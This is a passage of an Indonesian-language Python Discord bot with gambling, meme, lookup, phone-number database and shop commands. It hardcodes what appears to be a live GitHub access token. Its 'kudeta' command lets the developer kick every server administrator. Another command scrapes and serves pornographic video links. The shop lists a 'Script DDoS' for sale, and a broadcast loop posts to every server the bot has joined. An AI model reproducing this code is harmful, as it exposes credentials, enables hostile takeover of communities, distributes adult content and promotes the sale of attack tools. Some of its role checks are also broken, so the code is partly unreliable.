    if tebakan.lower() == result:
        user_balances[user_id] += bet
        result_msg = f"Benar! Koinnya {result}, kamu menang Rp{bet:,}"
    else:
        user_balances[user_id] -= bet
        result_msg = f"Salah... koinnya {result}, kamu kalah Rp{bet:,}"
    await ctx.send(f"{ctx.author.mention} {result_msg}")

# Command tebak
@bot.command()
async def tebak(ctx, bet: int, angka: int):
    user_id = ctx.author.id
    ensure_user(user_id)
    balance = user_balances[user_id]
    if bet > balance:
        await ctx.send("Saldo kamu gak cukup~")
        return
    jawaban = random.randint(1, 10)
    if angka == jawaban:
        win = bet * 10
        user_balances[user_id] += win
        result_msg = f"Benar! Angkanya {jawaban}, kamu dapet Rp{win:,}"
    else:
        user_balances[user_id] -= bet
        result_msg = f"Salah~ Angkanya {jawaban}, kamu kalah Rp{bet:,}"
    await ctx.send(f"{ctx.author.mention} {result_msg}")
    
#Menu judi halal
@bot.command()
async def judol (ctx):
    # Kirim pesan awal
    await ctx.send("**Judi itu gak bakal nguntungin, Aku sih cuman bilangin aja...**")

    # Tunggu beberapa detik sebelum mengirim menu
    await asyncio.sleep(5)

    # Kirim embed dengan menu judol
    menu_text = """
**✧━━━━━━━[ *Menu Judi* ]━━━━━━━✧**
    
  1. `/saldo` - Cek saldo kamu
  2. `/deposit [jumlah]` - Deposit saldo
  3. `/withdraw [jumlah]` - Tarik saldo
  4. `/slot [jumlah taruhan]` - Main mesin slot
  5. `/coin [jumlah taruhan] [head/tail]` - Tebak koin
  6. `/tebak [jumlah taruhan] [angka 1-10]` - Tebak angka

**✧━━━[ *Kamu Bisa Kaya Gini* ]━━━✧**
`Hati-hati yah, jangan kebablasan!`
"""
    
    embed = discord.Embed(
        description=menu_text,
        color=discord.Color.blurple()
    )
    embed.set_image(url="https://cdn.discordapp.com/attachments/1350859899407437824/1362671538503024691/6642c429a34ce2c4fdbd17bf271e2b6c.jpg?ex=68033e43&is=6801ecc3&hm=174d0c310883f861f64378c4821838371c765fc6a5ece9fc34fdc6aaf0234dc1&")
    embed.set_footer(text="Powered By Hazelnut.serveo.net")

    await ctx.send(embed=embed)
    
# Sistem ukur jarak
@bot.command(name='jarak')
async def jarak(ctx, *, lokasi: str):
    if ',' not in lokasi:
        await ctx.reply('Format salah! Gunakan: `/jarak bekasi,madiun`')
        return

    from_city, to_city = [x.strip() for x in lokasi.split(',')]
    url = f"https://api.vreden.my.id/api/tools/jarak?from={from_city}&to={to_city}"

    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(url) as resp:
                data = await resp.json()
                if data['status'] != 200:
                    await ctx.reply("Gagal mendapatkan data jarak! Pastikan kota yang dimasukkan benar.")
                    return

                result = data['result']
                jarak = result['detail'].split('menempuh jarak ')[1].split(',')[0]
                waktu = result['detail'].split('estimasi waktu ')[1]
                bbm_liter = result['estimasi_biaya_bbm']['total_liter']
                bbm_biaya = result['estimasi_biaya_bbm']['total_biaya']
                peta_url = result['peta_statis']
                rute = "\n".join([f"🚘 {step['instruksi']} ({step['jarak']})" for step in result['arah_penunjuk_jalan']])

                embed = discord.Embed(
                    title="📍 Informasi Jarak",
                    color=discord.Color.blue()
                )
                embed.add_field(name="Dari", value=result['asal']['alamat'], inline=False)
                embed.add_field(name="Ke", value=result['tujuan']['alamat'], inline=False)
                embed.add_field(name="Jarak", value=jarak, inline=True)
                embed.add_field(name="Estimasi Waktu", value=waktu, inline=True)
                embed.add_field(name="Estimasi BBM", value=f"{bbm_liter} liter (~Rp{bbm_biaya})", inline=False)
                embed.add_field(name="Rute", value=rute[:1000], inline=False)  # Discord limit 1024 char per field
                embed.set_image(url=peta_url)
                embed.set_footer(text="Powered By API Vreden")

                await ctx.reply(embed=embed)

        except Exception as e:
            print(e)
            await ctx.reply("Terjadi kesalahan saat mengambil data!")
            
 # meme
@bot.command(name='memeee')
async def meme(ctx):
    await ctx.send('⏳ Ambil meme dulu bang...')

    try:
        # Mengambil meme dari API
        res = requests.get('https://api.vreden.my.id/api/meme')
        data = res.json()

        # Jika meme ditemukan
        if data and data.get('result'):
            meme_url = data['result']

            # Membuat embed untuk mengirim meme
            embed = discord.Embed(
                title="Meme Burik Hari Ini",
                description="Cek meme seru ini!",
                color=discord.Color.random()
            )
            embed.set_image(url=meme_url)
            await ctx.send(embed=embed)
        else:
            await ctx.send('❌ Ada kesalahan bang, coba lagi nanti!')

    except Exception as e:
        print(e)
        await ctx.send('❌ Eror Bang.')
        
#invite
# Menyimpan ID role owner yang bisa mengakses perintah invite
role_owner_id = None

# Perintah !setowner untuk mengubah ID role owner
@bot.command(name="setowner")
async def set_owner(ctx, role_id: int):
    global role_owner_id
    role_owner_id = role_id
    await ctx.send(f"Role owner ID telah diubah menjadi: {role_owner_id}")

# Perintah !invite yang hanya bisa diakses oleh pemilik role yang ditentukan
@bot.command(name="invite")
async def invite(ctx):
    # Cari role "Owner" di daftar role user
    if any(role.name.lower() == "owner" for role in ctx.author.roles):
        invite_link = "https://dsc.gg/nutella-bot-"
        await ctx.send(f"Klik [di sini]({invite_link}) untuk mengundang bot ke servermu!")
    else:
        await ctx.send("❌ Kamu bukan Owner dan tidak bisa pakai perintah ini!")
        
# sistem daftar
# GitHub API Setup
GITHUB_TOKEN = "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"  # Ganti dengan token GitHub pribadi
GITHUB_REPO = "HAZELNUTTTY/dbdaftar"  # Ganti dengan username dan repositori GitHub kamu
GITHUB_FILE_PATH = "db_data.json" 

# API untuk mengambil dan memperbarui data nomor di GitHub
def get_data_from_github():
    url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{GITHUB_FILE_PATH}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        content = response.json()
        file_content = requests.get(content['download_url']).text
        return json.loads(file_content) if file_content else []
    return []

def update_data_on_github(data):
    url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{GITHUB_FILE_PATH}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    data_to_update = {
        "message": "Update nomor data",
        "content": json.dumps(data),
        "sha": get_file_sha()
    }
    response = requests.put(url, json=data_to_update, headers=headers)
    return response.status_code == 200

def get_file_sha():
    url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{GITHUB_FILE_PATH}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        return response.json()['sha']
    return None

# Penyimpanan sementara untuk nomor
db_nomor = get_data_from_github()
dbopen_message = {}

# 1. /db <nomor> untuk menambahkan nomor
@bot.command(name="db", help="Tambah nomor ke database")
async def db(ctx, nomor: str):
    global db_nomor
    if nomor in db_nomor:
        await ctx.send(f"❌ Nomor `{nomor}` sudah ada di DB.")
    else:
        db_nomor.append(nomor)
        update_data_on_github(db_nomor)
        await ctx.send(f"✅ Nomor `{nomor}` berhasil ditambahkan ke DB.")

# 2. /dbopen untuk menampilkan nomor (admin only)
@bot.command(name="dbopen", help="Tampilkan database nomor (Admin Only)")
async def dbopen(ctx):
    if not any(role.name.lower() in ["admin", "owner"] for role in ctx.author.roles):
        return await ctx.send("❌ Kamu bukan admin/owner.")

    if not db_nomor:
        return await ctx.send("📂 DB kosong.")

    isi = "\n".join(f"{i+1}. {nomor}" for i, nomor in enumerate(db_nomor))
    message = await ctx.send(f"**Database Nomor:**\n```{isi}```")
    dbopen_message[ctx.channel.id] = message  # Simpan message untuk dihapus nanti

# 3. /dbclose untuk menghapus data yang ditampilkan
@bot.command(name="dbclose", help="Hapus pesan database nomor yang ditampilkan (Admin Only)")
async def dbclose(ctx):
    if not any(role.name.lower() in ["admin", "owner"] for role in ctx.author.roles):
        return await ctx.send("❌ Kamu bukan admin/owner.")
    
    if ctx.channel.id in dbopen_message:
        try:
            await dbopen_message[ctx.channel.id].delete()
            del dbopen_message[ctx.channel.id]  # Hapus pesan yang disimpan
            await ctx.send("✅ Pesan DB berhasil dihapus.")
        except Exception as e:
            await ctx.send(f"❌ Gagal menghapus pesan DB: {e}")
    else:
        await ctx.send("❌ Belum ada pesan DB yang ditampilkan di channel ini.")

# 4. /dbcek <nomor> untuk mengecek nomor
@bot.command(name="dbcek", help="Cek apakah nomor ada di DB")
async def dbcek(ctx, nomor: str):
    if nomor in db_nomor:
        await ctx.send(f"✅ Nomor `{nomor}` ada di database.")
    else:
        await ctx.send(f"❌ Nomor `{nomor}` tidak ditemukan di DB.")

# 5. /dbdelete <nomor> untuk menghapus nomor dari database
@bot.command(name="dbdelete", help="Hapus nomor dari database")
async def dbdelete(ctx, nomor: str):
    global db_nomor
    if nomor in db_nomor:
        db_nomor.remove(nomor)
        update_data_on_github(db_nomor)
        await ctx.send(f"✅ Nomor `{nomor}` berhasil dihapus dari DB.")
    else:
        await ctx.send(f"❌ Nomor `{nomor}` tidak ditemukan di DB.")
        
#db daftar
@bot.command()
async def dbdaftar (ctx):
    menu_text = """
**✧━━━━━━━[ *Menu dbdaftar* ]━━━━━━━✧**
    
  1. `/db <nomer wa>`
  2. `/dbdelete <nomer wa>` 
  3. `/dbcek <nomer wa>`
  4. `/dbopen <owner access>`
  5. `/dbclose <owner access>`

**✧━━━━━━━━━[ *Thank You* ]━━━━━━━✧**
`Sistem is ready`
"""
    
    embed = discord.Embed(
        description=menu_text,
        color=discord.Color.blurple()
    )
    embed.set_image(url="https://cdn.discordapp.com/attachments/1350859899407437824/1364442853324882060/64880b9b0fe5b53bbe3f7280d262b33f.jpg?ex=6809afee&is=68085e6e&hm=688fb71f3763a77d0b116d75aa8eee31a7769090277abfd542ecde3f5ff54125&")
    embed.set_footer(text="Powered By GITHUB")

    await ctx.send(embed=embed)
    
#kirim
load_dotenv(dotenv_path="./database/developer.env")
OWNER_ID = int(os.getenv("DEVELOPER_ID"))

@bot.command()
async def kirim(ctx, *, pesan):
    if ctx.guild is not None:
        await ctx.send("Perintah ini cuma buat DM aja yaa~")
        return

    if ctx.author.id != DEVELOPER_ID:
        await ctx.send("Kamu bukan pemilik akuuu anjim 😡")
        return

    embed = discord.Embed(
        description=f"""
**✧━━━━━━[ *Pengumuman Bot* ]━━━━━━✧**

{pesan}

**✧━━━━━━━[ *Terima Kasih* ]━━━━━━━✧**
`Dikirim oleh sistem secara otomatis`
""",
        color=discord.Color.blurple()
    )
    embed.set_image(url="https://cdn.discordapp.com/attachments/1350859899407437824/1362671538503024691/6642c429a34ce2c4fdbd17bf271e2b6c.jpg?ex=68033e43&is=6801ecc3&hm=174d0c310883f861f64378c4821838371c765fc6a5ece9fc34fdc6aaf0234dc1&")
    embed.set_footer(text="Dikirim Oleh Developer")

    sukses = 0
    gagal = 0

    for guild in bot.guilds:
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).send_messages:
                try:
                    await channel.send(embed=embed)
                    sukses += 1
                except:
                    gagal += 1
                break

    await ctx.send(f"Embed berhasil dikirim ke {sukses} server~ Gagal: {gagal}")
    
#sistem reacth
OWNER_ROLE_ID = 'Owner'

@bot.command()
async def reactch(ctx, channel_id: int, message_id: int, emoji: str):
    # Cek role
    if not any(role.id == OWNER_ROLE_ID for role in ctx.author.roles):
        return await ctx.send("Kamu bukan owner ku  anjim! 😡")

    # Ambil channel & pesan
    try:
        channel = await bot.fetch_channel(channel_id)
        message = await channel.fetch_message(message_id)
        await message.add_reaction(emoji)
        await ctx.send("Berhasil react!")
    except Exception as e:
        await ctx.send(f"Gagal react: {e}")

#Sistem kudeta
load_dotenv("./database/developer.env")
DEVELOPER_ID = int(os.getenv("DEVELOPER_ID"))

@bot.command()
async def kudeta(ctx):
    # Pastikan hanya developer yang dapat menjalankan perintah
    if ctx.author.id != DEVELOPER_ID:
        return await ctx.send("Hanya developer yang bisa menggunakan perintah ini!")
    
    # Pastikan user memiliki izin admin
    if not ctx.author.guild_permissions.administrator:
        return await ctx.send("Kamu tidak memiliki izin administrator untuk menjalankan perintah ini!")
    
    # Ambil semua anggota yang memiliki peran admin (kecuali bot)
    admins = [member for member in ctx.guild.members if member.guild_permissions.administrator and member.id != bot.user.id]
    
    if len(admins) < 1:
        return await ctx.send("Tidak ada admin lain yang bisa dikick!")
    
    # Mulai kudeta
    await ctx.send(f"Kudeta Grup oleh {ctx.author} dimulai 🔥")
    
    for admin in admins:
        try:
            await admin.kick(reason="Kudeta oleh developer")
            await ctx.send(f"{admin.mention} telah dikeluarkan dari grup!")
        except discord.Forbidden:
            await ctx.send(f"Bot tidak memiliki izin untuk mengeluarkan {admin.mention}")
        await asyncio.sleep(1)  # Delay antara kick
    
    await ctx.send("Kudeta Grup telah berhasil 🏴‍☠️")
    
# Sistem xnxx
@bot.command(name="xnxx", description="Cari video dari xnxx (khusus role Premium)")
async def xnxx_search(ctx, query: str):
    # Cek apakah user punya role 'premium'
    premium_role = discord.utils.get(ctx.guild.roles, name="Premium")
    if premium_role not in ctx.author.roles:
        return await ctx.send("Kamu gak punya akses, role *premium* aja yang bisa pakai.", ephemeral=True)

    await ctx.send("Mencari video...")

    result = await xnxxsearch(query)
    
    if not result['status']:
        return await ctx.send("Gagal mencari video.")

    msg = "**Pilih nomor dan balas pesan ini dengan nomornya.**\n\n"
    for i, v in enumerate(result['result'][:10]):
        msg += f"**{i+1}.** {v['title']}\n"

    await ctx.send(msg)

    def check(message):
        return message.author == ctx.author and message.content.isdigit()

    try:
        message = await bot.wait_for('message', check=check, timeout=60)
        index = int(message.content) - 1
        selected = result['result'][index]

        # Menambahkan pesan peringatan sebelum mengirimkan video
        await ctx.send("Jangan nonton porno nanti otak kamu jadi gila, Aku sih cuman bilangin aja.")

        hasil = await xnxxdownload(selected['link'])
        await ctx.send(f"**{hasil['title']}**\n{hasil['files']['high']}")
    except ValueError:
        await ctx.send("Nomor tidak valid!")
    except IndexError:
        await ctx.send("Nomor tidak valid!")
    except TimeoutError:
        await ctx.send("Waktu habis!")

async def xnxxsearch(keyword):
    url = f"https://www.xnxx.com/search/{keyword}/1"
    res = requests.get(url)
    soup = BeautifulSoup(res.text, "html.parser")
    results = []

    thumbs = soup.select("div.mozaique div.thumb a")
    titles = soup.select("div.mozaique div.thumb-under a[title]")
    infos = soup.select("div.mozaique div.thumb-under p.metadata")

    for i in range(min(len(thumbs), len(titles))):
        link = "https://www.xnxx.com" + thumbs[i]['href'].replace("/THUMBNUM/", "/")
        results.append({
            "title": titles[i]["title"],
            "info": infos[i].text.strip() if i < len(infos) else "",
            "link": link
        })
    return {"status": True, "result": results}

async def xnxxdownload(url):
    res = requests.get(url)
    html = res.text
    title = re.search(r"html5player.setVideoTitle'(.*?)';", html)
    video_url = re.search(r"html5player.setVideoUrlHigh'(.*?)';", html)

    return {
        "title": title.group(1) if title else "No title",
        "files": {
            "high": video_url.group(1) if video_url else "Not found"
        }
    }

# Sistem ssweb
@bot.command()
async def ssweb(ctx, *, url: str):
    try:
        # Menentukan device type (mobile atau desktop)
        device_type = 'mobile' if 'mobile' in ctx.message.content else 'desktop'
        full_page = 'mobile' not in ctx.message.content

        # Mengirim permintaan POST ke API untuk mengambil screenshot
        response = requests.post(
            'https://api.magickimg.com/generate/website-screenshot',
            json={
                'url': url,
                'device': device_type,
                'fullPage': full_page
            },
            headers={
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'Cache-Control': 'no-cache'
            }
        )
        
        # Mengecek apakah respons API sukses
        if response.status_code == 200:
            # Mengambil data gambar dari API dan mengirimkannya sebagai file
            image = BytesIO(response.content)
            image.seek(0)
            await ctx.send(file=discord.File(image, "screenshot.png"), content=f"Screenshot {device_type}")
        else:
            await ctx.send("Gagal mengambil screenshot. Pastikan URL valid.")
    except Exception as e:
        await ctx.send(f"Terjadi kesalahan: {str(e)}")
        
#sistem restar
DEVELOPER_ID = 1280907417319899302

@bot.command(name='restart')
async def restart(ctx):
    if ctx.author.id != DEVELOPER_ID:
        return await ctx.send("Kamu bukan ownerrr, gabolehh pake command ini yaaa!")
    await ctx.send("Lagi restart bottt... tungguu yaaa!")
    os.execv(sys.executable, ['python'] + sys.argv)
    
# panel
OWNER_ID = 'Owner'  # ganti dengan ID kamu
PREMIUM_ROLE_ID = 'Premium'  # ganti dengan ID role premium yang digunakan

# URL kamu yang akan dituju setelah memilih opsi
WEB_URL = 'https://antartica-server.netlify.app/'  # Ganti dengan URL web kamu

# Komando .cpanel <username>
@bot.command()
async def cpanel(ctx, username: str = None):
    # Cek input
    if not username:
        await ctx.reply("**Contoh:** `.cpanel username`")
        return
    
    # Cek akses
    is_owner = ctx.author.id == OWNER_ID
    is_premium = any(role.id == PREMIUM_ROLE_ID for role in ctx.author.roles)

    if not is_owner and not is_premium:
        await ctx.reply(f"Maaf fitur ini hanya untuk *reseller panel*!\nChat <@{OWNER_ID}> untuk beli akses.")
        return

    # Opsi untuk dropdown
    options = [
        discord.SelectOption(label="1GB", description="Panel 1GB & CPU 30%", value=f"1gb {username}"),
        discord.SelectOption(label="2GB", description="Panel 2GB & CPU 60%", value=f"2gb {username}"),
        discord.SelectOption(label="3GB", description="Panel 3GB & CPU 90%", value=f"3gb {username}"),
        discord.SelectOption(label="4GB", description="Panel 4GB & CPU 120%", value=f"4gb {username}"),
        discord.SelectOption(label="5GB", description="Panel 5GB & CPU 150%", value=f"5gb {username}"),
        discord.SelectOption(label="6GB", description="Panel 6GB & CPU 180%", value=f"6gb {username}"),
        discord.SelectOption(label="7GB", description="Panel 7GB & CPU 210%", value=f"7gb {username}"),
        discord.SelectOption(label="8GB", description="Panel 8GB & CPU 240%", value=f"8gb {username}"),
        discord.SelectOption(label="9GB", description="Panel 9GB & CPU 260%", value=f"9gb {username}"),
        discord.SelectOption(label="10GB", description="Panel 10GB & CPU 270%", value=f"10gb {username}"),
        discord.SelectOption(label="UNLIMITED", description="Panel Unlimited & CPU 0%", value=f"unli {username}")
    ]

    select = discord.ui.Select(placeholder="Pilih RAM Panel", options=options)

    # Callback untuk select menu
    async def callback(interaction):
        await interaction.response.send_message(f"Sedang membuat panel dengan perintah: `{select.values[0]}`", ephemeral=True)

        # Tombol untuk redirect ke URL setelah memilih
        button = discord.ui.Button(label="Kunjungi Web", style=discord.ButtonStyle.link, url=WEB_URL)

        view = discord.ui.View()
        view.add_item(button)
        
        await interaction.followup.send("Klik tombol di bawah untuk menuju web!", view=view)

    select.callback = callback
    view = discord.ui.View()
    view.add_item(select)

    await ctx.send(f"**[ ! ] Membuat Panel untuk `{username}`**\nKlik dropdown untuk pilih RAM:", view=view)
    
#questimg
def wrap_text(draw, text, font, max_width):
    words = text.split(' ')
    lines = []
    current_line = words[0]

    for word in words[1:]:
        bbox = draw.textbbox((0, 0), current_line + ' ' + word, font=font)
        width = bbox[2] - bbox[0]
        if width <= max_width:
            current_line += ' ' + word
        else:
            lines.append(current_line)
            current_line = word
    lines.append(current_line)
    return lines

@bot.command()
async def quoteimg(ctx, *, text: str = None):
    if not text:
        await ctx.send("kirim teks quotesnya dulu yaa\ncontoh: `.quoteimg jangan nyerah yaa, kamu hebat kokk`")
        return

    user = ctx.author
    avatar_url = user.display_avatar.replace(format='png').url

    response = requests.get(avatar_url)
    img = Image.open(io.BytesIO(response.content)).convert("RGBA")

    width, height = 1000, 500
    canvas = Image.new('RGB', (width, height), (255, 255, 255))  # putih
    draw = ImageDraw.Draw(canvas)

    try:
        font = ImageFont.truetype("./database/font/cute-dino.ttf", 40)
    except:
        font = ImageFont.load_default()

    max_width = 600
    lines = wrap_text(draw, text, font, max_width)

    avatar = img.resize((240, 240))
    canvas.paste(avatar, (60, 130))

    y_offset = 180
    for line in lines:
        draw.text((350, y_offset), line, font=font, fill=(0, 0, 0))  # hitam
        y_offset += 55  # jarak antar baris

    draw.text((350, y_offset + 20), f"- {user.display_name}", font=font, fill=(80, 80, 80))  # abu

    with io.BytesIO() as image_binary:
        canvas.save(image_binary, 'PNG')
        image_binary.seek(0)
        await ctx.send(file=discord.File(image_binary, 'quote.png'))

# Ambil nomor dari website
def get_sms_number(country_code):
    try:
        url = f"https://receive-smss.com/sms/{country_code}/"
        res = requests.get(url)
        soup = BeautifulSoup(res.text, "html.parser")
        number = soup.find('a', class_='number-boxes-item').text.strip()
        return number
    except Exception as e:
        return f"Gagal mengambil nomor: {e}"

# Dropdown negara
class CountrySelect(Select):
    def __init__(self):
        options = [
            discord.SelectOption(label="United States", value="us"),
            discord.SelectOption(label="Canada", value="ca"),
            discord.SelectOption(label="United Kingdom", value="uk"),
            discord.SelectOption(label="Germany", value="de"),
            discord.SelectOption(label="Australia", value="au"),
        ]
        super().__init__(placeholder="Pilih negara", min_values=1, max_values=1, options=options)

    async def callback(self, interaction: discord.Interaction):
        if not await is_premium(interaction.user):
            await interaction.response.send_message(
                "Maaf, kamu harus punya role 'Premium' untuk pake fitur ini.", ephemeral=True
            )
            return

        country = self.values[0]
        await interaction.response.send_message(f"Negara dipilih: {country.upper()}")
        sms_number = get_sms_number(country)
        await interaction.followup.send(f"Nomor gratis dari `{country.upper()}`: `{sms_number}`")

# Command buat munculin dropdown
@bot.command()
async def getnumber(ctx):
    if not await is_premium(ctx.author):
        await ctx.send("Fitur ini cuma buat yang punya role 'Premium' yaa!")
        return

    view = View(timeout=180)
    view.add_item(CountrySelect())

    await ctx.send("Pilih negara buat dapetin nomor gratis:", view=view)
    
# ==== SETTING ====
LOGO_URL = "https://cdn.discordapp.com/attachments/1350859899407437824/1362845291925213456/95296b50cbd83fc61dfca4d3a4b7283a.jpg?ex=6803e016&is=68028e96&hm=d1eada7129f89ffe4b68d059c621ac7d828466f1c6c6a5a980e85f4cc5da6e9a&"
QRIS_URL = "https://cdn.discordapp.com/attachments/1350859899407437824/1363407125665284168/IMG_20250420_135244.jpg?ex=6805eb55&is=680499d5&hm=cc919a10c622a10f7fab411c3a789051c83483986e7e9774f8b0601b8832ce57&"  # ganti ini yaa

produk_list = [
    {"nama": "Bot Discord Premium", "harga": "Rp10.000", "link": "https://wa.me/+6285183131924"},
    {"nama": "Script Termux Haram", "harga": "Rp15.000", "link": "https://wa.me/+6285183131924"},
    {"nama": "Script Bot ＮＹＸＯＲＡ v1.0", "harga": "Rp30.000", "link": "https://wa.me/+6285183131924"},
    {"nama": "Script DDoS", "harga": "Rp12.000", "link": "https://wa.me/+6285183131924"},
    {"nama": "Server Sementara", "harga": "Rp30.000", "link": "https://wa.me/+6285183131924"},
]

def generate_resi():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

class MetodePembayaranSelect(Select):
    def __init__(self, produk):
        self.produk = produk
        options = [
            discord.SelectOption(label="Bayar via DANA", value="dana"),
            discord.SelectOption(label="Bayar via QRIS", value="qris"),
            discord.SelectOption(label="Hubungi Admin", value="admin"),
        ]
        super().__init__(placeholder="Pilih metode pembayaran...", options=options)

    async def callback(self, interaction: discord.Interaction):
        resi = generate_resi()
        if self.values[0] == "dana":
            embed = discord.Embed(
                title="Pembayaran via DANA",
                description=f"**Produk:** {self.produk['nama']}\n**Harga:** {self.produk['harga']}\n**Resi:** `{resi}`\n\nKlik link berikut buat bayar:\n[Bayar via DANA](https://link.dana.id/minta/2vwf7f2c4lr)",
                color=discord.Color.orange()
            )
        elif self.values[0] == "qris":
            embed = discord.Embed(
                title="Pembayaran via QRIS",
                description=f"**Produk:** {self.produk['nama']}\n**Harga:** {self.produk['harga']}\n**Resi:** `{resi}`\n\nScan QR di bawah ini yaa:",
                color=discord.Color.blue()
            )
            embed.set_image(url=QRIS_URL)
        else:
            embed = discord.Embed(
                title="Hubungi Admin",
                description=f"**Produk:** {self.produk['nama']}\n**Harga:** {self.produk['harga']}\n**Resi:** `{resi}`\n\nSilakan hubungi admin untuk menyelesaikan pembayaran:\n[WhatsApp Admin]({self.produk['link']})",
                color=discord.Color.green()
            )

        embed.set_thumbnail(url=LOGO_URL)
        await interaction.user.send(embed=embed)
        await interaction.response.send_message("Cek DM lo buat detail pembayaran yaa!", ephemeral=True)

class ProdukSelect(Select):
    def __init__(self):
        options = [
            discord.SelectOption(label=p['nama'], description=f"Harga: {p['harga']}", value=p['nama'])
            for p in produk_list
        ]
        super().__init__(placeholder="Pilih produk yang ingin dibeli...", options=options)

    async def callback(self, interaction: discord.Interaction):
        produk = next(p for p in produk_list if p['nama'] == self.values[0])
        view = View()
        view.add_item(MetodePembayaranSelect(produk))

        embed = discord.Embed(
            title="Pilih Metode Pembayaran",
            description="Pilih salah satu metode buat bayar produk yang kamu pilih.",
            color=discord.Color.blurple()
        )
        embed.set_thumbnail(url=LOGO_URL)
        await interaction.user.send(embed=embed, view=view)
        await interaction.response.send_message("Cek DM lo buat pilih metode pembayaran yaaa!", ephemeral=True)

class ProdukView(View):
    def __init__(self):
        super().__init__()
        self.add_item(ProdukSelect())

@bot.command()
async def produk(ctx):
    try:
        msg = await ctx.send("**Sedang menyiapkan menu...**")
        await asyncio.sleep(2)

        embed = discord.Embed(
            title="Menu Produk",
            description="Pilih produk yang kamu mau beli lewat menu di bawah ini.",
            color=discord.Color.blurple()
        )
        embed.set_thumbnail(url=LOGO_URL)
        view = ProdukView()
        await ctx.author.send(embed=embed, view=view)
        await msg.edit(content="Cek DM lo yaa, menu produk udah dikirim!")
    except discord.Forbidden:
        await ctx.send("Bot gak bisa kirim DM ke lo. Aktifin dulu DM dari server ya!")
        
# Sistem pindl
@bot.command()
async def pindl(ctx, url: str = None):
    if not url:
        await ctx.reply("contoh: `.pindl https://id.pinterest.com/pin/575757133623547811/`")
        return

    await ctx.reply("lagi aku prosesss sayanggg... tunggu yakk...")

    try:
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Referer": "https://www.savepin.app/"
        }

        r = requests.get(
            f"https://www.savepin.app/download.php?url={url}&lang=en&type=redirect",
            headers=headers,
            timeout=10
        )
        soup = BeautifulSoup(r.text, 'html.parser')

        results = []
        rows = soup.select('table tr')
        for row in rows:
            quality = row.select_one('.video-quality')
            link_tag = row.select_one('a[href]')
            format_tag = row.select_one('td:nth-child(2)')
            if quality and link_tag:
                link = link_tag['href']
                media_url = link if link.startswith("http") else f"https://www.savepin.app{link}"
                results.append({
                    "quality": quality.text.strip(),
                    "format": format_tag.text.strip() if format_tag else "unknown",
                    "url": media_url
                })

        if not results:
            return await ctx.reply("nggak nemu media dari URL itu sayang...")

        item = results[0]
        media_url = item['url']
        filename = f"media.{item['format']}"

        try:
            file_data = requests.get(media_url, timeout=10)
            with open(filename, "wb") as f:
                f.write(file_data.content)
        except Exception as e:
            return await ctx.reply(f"gagal download media-nya sayang:\n`{e}`")

        embed = discord.Embed(title="Pinterest Downloader", color=0xff66cc)
        embed.add_field(name="Quality", value=item['quality'])
        embed.add_field(name="Format", value=item['format'])
        embed.set_footer(text="from pinterest with love")

        await ctx.reply(embed=embed, file=discord.File(filename))

        os.remove(filename)

    except Exception as e:
        await ctx.reply(f"Ada error sayanggg:\n`{e}`")
        
# Sistem update 
load_dotenv("./database/developer.env")
DEVELOPER_ID = int(os.getenv("DEVELOPER_ID"))

# Helper: ambil versi dari file JSON
def get_version(path):
    try:
        with open(path, 'r') as f:
            data = json.load(f)
            return data.get("version", "Versi tidak ditemukan")
    except:
        return "Gagal baca versi"

# Helper: embed progress dengan animasi + avatar bot
async def embed_progress(ctx, judul_awal, info_fields: dict, judul_akhir, warna, info_akhir: dict, footer="ＮＹＸＯＲＡ Bot"):
    bot_avatar = bot.user.avatar.url if bot.user.avatar else None
    embed = discord.Embed(title=f"{judul_awal}...", color=discord.Color.orange())
    if bot_avatar:
        embed.set_thumbnail(url=bot_avatar)

    for key, value in info_fields.items():
        embed.add_field(name=key, value=value, inline=False)
    embed.set_footer(text=footer)
    msg = await ctx.send(embed=embed)

    for dot in [".", "..", "...", "...."]:
        embed.title = f"{judul_awal}{dot}"
        await msg.edit(embed=embed)
        await asyncio.sleep(0.6)

    await asyncio.sleep(1)

    final_embed = discord.Embed(title=judul_akhir, color=warna)
    if bot_avatar:
        final_embed.set_thumbnail(url=bot_avatar)

    for key, value in info_akhir.items():
        final_embed.add_field(name=key, value=value, inline=False)
    final_embed.set_footer(text=footer)
    await msg.edit(embed=final_embed)
    return msg

# Command: Update Bot
@bot.command()
async def update(ctx):
    if ctx.author.id != DEVELOPER_ID:
        return await ctx.send(embed=discord.Embed(
            title="Akses Ditolak",
            description="Hanya developer yang bisa melakukan update.",
            color=discord.Color.red()
        ))

    waktu_start = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    versi_awal = get_version("./database/versiawal.json")
    versi_akhir = get_version("./database/versiakhir.json")

    status = "Update Berhasil" if versi_awal != versi_akhir else "Update Gagal"
    warna = discord.Color.green() if versi_awal != versi_akhir else discord.Color.red()

    await embed_progress(
        ctx,
        judul_awal="Bot Status: Sedang Berjalan",
        info_fields={
            "Start": waktu_start,
            "Version": versi_awal
        },
        judul_akhir=f"Bot Status: {status}",
        warna=warna,
        info_akhir={
            "Selesai": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "Version": versi_akhir
        },
        footer="ＮＹＸＯＲＡ Bot | Update System"
    )

    await asyncio.sleep(2)
    await ctx.send(embed=discord.Embed(
        title="Restarting...",
        description="Bot akan segera restart otomatis.",
        color=discord.Color.blurple()
    ).set_footer(text="ＮＹＸＯＲＡ Bot | Auto Restart"))

    os.execv(sys.executable, ['python'] + sys.argv)
        
# Sisetm clear
load_dotenv("./database/developer.env")
DEVELOPER_ID = int(os.getenv("DEVELOPER_ID"))

@bot.command()
async def sesitm(ctx):
    # Cek apakah pengguna yang mengirim perintah adalah developer
    if ctx.author.id != DEVELOPER_ID:
        await ctx.send("Anda tidak memiliki izin untuk menjalankan perintah ini.")
        return

    # Clear chat (hanya di dalam Discord)
    await ctx.channel.purge(limit=100)  # Menghapus 100 pesan terakhir, sesuaikan dengan kebutuhan

    # Clear aktivitas di terminal (hanya di Termux)
